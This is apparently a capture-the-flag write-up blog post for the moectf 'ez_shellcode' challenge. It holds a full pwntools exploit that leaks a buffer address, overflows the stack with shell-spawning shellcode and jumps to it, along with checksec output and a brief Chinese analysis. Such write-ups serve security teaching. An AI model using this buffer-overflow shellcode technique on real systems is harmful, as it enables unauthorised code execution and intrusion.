    <div class="post-body" itemprop="articleBody"><h1 id="moectf-ez-shellcode"><a href="#moectf-ez-shellcode" class="headerlink" title="moectf ez_shellcode"></a>moectf ez_shellcode</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>,<span class="string">&#x27;wsl&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;age&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;130&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;you :\n&quot;</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>).decode(), <span class="number">16</span>)</span><br><span class="line">payload = asm(shellcraft.sh()).ljust(<span class="number">0x60</span>+<span class="number">0x8</span>,<span class="string">b&#x27;a&#x27;</span>) + p64(buf_addr)</span><br><span class="line">p.recvuntil(<span class="string">&quot;say&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">❯ checksec pwn</span><br><span class="line">[*] &#x27;/home/pwn/pwn/moectf/ez_shellcode/pwn&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>



<p><img src="/./images/image-20250216172734148.png" alt="image-20250216172734148"></p>
<p>可以看到第一个输入名字就是我们的输入长度，然后还将输入地址打印出来，并且还有<code>RWX</code>区域，直接写入shellcode就好</p>
